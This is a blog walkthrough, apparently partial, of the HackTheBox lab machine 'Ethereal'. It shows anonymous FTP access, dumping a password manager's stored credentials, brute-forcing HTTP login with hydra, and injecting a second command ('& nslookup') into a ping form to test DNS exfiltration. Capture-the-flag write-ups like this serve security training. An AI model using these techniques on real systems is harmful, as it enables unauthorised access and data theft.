---
layout: single
classes: wide
title:  "Walkthrough - Ethereal"
date: 2019-03-23
categories:
    - "hackthebox"
tags:
    - machines
    - insane
    - windows
excerpt:  ""
---


![alt]({{ site.url }}{{ site.baseurl }}/img_path)

Before following this walkthrough, I highly recommend trying to get the flag yourself! Just like you will hear from everyone else, try harder! (if you cannot find it)

First up, we'll scan the box using basic nmap scripts and then go from there (Enumerate!).

```console
# Nmap 7.70 scan initiated Sat Mar 23 11:04:51 2019 as: nmap -v -p- -sC -sV -oA nmap 10.10.10.106
Nmap scan report for 10.10.10.106
Host is up (0.11s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.16.249.135 is not the same as 10.10.10.106
| ftp-syst:
|_  SYST: Windows_NT
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ethereal
8080/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Well, so we have a few ports open, port 21, 80 and 8080.

## Port 21

I always like to check the low-hanging fruit first. So let's get into FTP since `anonymous` login is allowed. This is a common misconfiguration for FTP logins. You never know what you might find but always is useful.

```console
pswapnil@noone:~/Ethereal$ ftp 10.10.10.106
Connected to 10.10.10.106.
220 Microsoft FTP Service
Name (10.10.10.106:pswapnil): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
07-10-18  09:03PM       <DIR>          binaries
09-02-09  08:58AM                 4122 CHIPSET.txt
01-12-03  08:58AM              1173879 DISK1.zip
01-22-11  08:58AM               182396 edb143en.exe
01-18-11  11:05AM                98302 FDISK.zip
07-10-18  08:59PM       <DIR>          New folder
07-10-18  09:38PM       <DIR>          New folder (2)
07-09-18  09:23PM       <DIR>          subversion-1.10.0
11-12-16  08:58AM                 4126 teamcity-server-log4j.xml
226 Transfer complete.
```

I created a copy of the FTP data on my local drive. Found a zip file `FDISK.zip`, unzipped it and mounted it as a drive.

```console
pswapnil@noone:~/Ethereal/ftp-data$ mount FDISK fdisk
pswapnil@noone:~/Ethereal/ftp-data$ ls -la fdisk/pbox
total 88
drwxr-xr-x 2 root root   512 Jul  2  2018 .
drwxr-xr-x 3 root root  7168 Dec 31  1969 ..
-rwxr-xr-x 1 root root   284 Jul  2  2018 pbox.dat
-rwxr-xr-x 1 root root 81384 Aug 25  2010 pbox.exe
```

`pbox`?! What's that? A little Google-Fu and I found that it's a password box or a dos-based password manager.
So, I used this [software](https://sourceforge.net/projects/passwbox/files/latest/download) to try and load the data from the `.dat` file.

I copied the `pbox.dat` file I found in the FTP session to my home directory as `.pbox.dat`. After executing the pbox client we just downloaded for Linux, it prompted me for the password.

```console
swapnil@swapnil:/home/swapnil/Downloads $ ./pbox                 
Enter your master password: password
```

I guessed the password trying out `admin`, `pbox`, etc, got it right for `password`. It opened the following screen.

![pbox]({{ site.url }}{{ site.baseurl }}/assets/HTB_images/machines/ethereal/pbox.png)

Using the `--dump` option, I was able to dump all the usernames and passwords and store them locally.

```console
swapnil@swapnil:/home/swapnil/Downloads $ ./pbox --dump
Enter your master password: ********
databases  ->  7oth3B@tC4v3!
msdn  ->  alan@ethereal.co / P@ssword1!
learning  ->  alan2 / learn1ng!
ftp drop  ->  Watch3r
backup  ->  alan / Ex3cutiv3Backups
website uploads  ->  R3lea5eR3@dy#
truecrypt  ->  Password8
management server  ->  !C414m17y57r1k3s4g41n!
svn  ->  alan53 / Ch3ck1ToU7>
```

That was it from FTP. I believe, the tedious process to just be able to obtain a dump is evidence that this box isn't an wasy one.

## Port 80 and 8080

In the web browser, we get the following window as a welcome page.

![ethereal]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/ethereal/ethereal-80.png)

Moving around, I found a menu item called `Admin`, let's go there.

![ethereal-admin]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/ethereal/ethereal-admin.png)

Many menu items here as well. The only important one was `Ping`. Clicking on it redirected me to `ethereal.htb:8080` and gave me the following page.

![ethereal-8080]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/ethereal/ethereal-8080.png)

Time to add `ethereal.htb` to the `hosts` file. Also, the `Notes` menu took me to a page where it mentioned the name `Alan`, ring a bell? It's the same name that appeared in the `pbox` dump.

![ethereal-notes]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/ethereal/admin-notes.png)

After the `hosts` file is updated, clicking the `Ping` option again got me an HTTP authentication page.

![ethereal-httpauth]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/ethereal/httpauth-8080.png)

Fortunately, we have a list of usernames and passwords from the dump that we obtained earlier. Use that to brute-force the HTTP authentication.

```console
root@kali# hydra -L usernames -P passwords -s 8080 -f ethereal.htb http-get /
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

[DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries (l:4/p:9), ~3 tries per task
[DATA] attacking http-get://ethereal.htb:8080/
[8080][http-get] host: ethereal.htb   login: alan   password: !C414m17y57r1k3s4g41n!
1 of 1 target successfully completed, 1 valid password found
```

There's the login. Using that, we find this page.

![admin-console]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/ethereal/admin-console.png)

I put my IP address in the text-field and it showed `Connection to host successful`. Let's try to capture packets this time around using `tcpdump`.

```console
root@kali:~# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
12:57:58.345968 IP ethereal.htb > kali: ICMP echo request, id 1, seq 235, length 40
12:57:58.345989 IP kali > ethereal.htb: ICMP echo reply, id 1, seq 235, length 40
12:57:59.616726 IP ethereal.htb > kali: ICMP echo request, id 1, seq 236, length 40
12:57:59.616884 IP kali > ethereal.htb: ICMP echo reply, id 1, seq 236, length 40
```

We get 2 pings! Looks weird. Based on a guess, it's running something like `ping -n2 <ip>`. Let's find out if this box allows DNS queries. I'll use `& nslookup abcde <myip>` in the text field. Try to see it using tcpdump.

```console
pswapnil@noone:~/Ethereal$ tcpdump -ni tun0 udp port 53
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
19:49:18.150063 IP 10.10.10.106.50772 > 10.10.16.39.53: 3+ AAAA? abcde. (23)
```

Great! So we can get data from DNS.
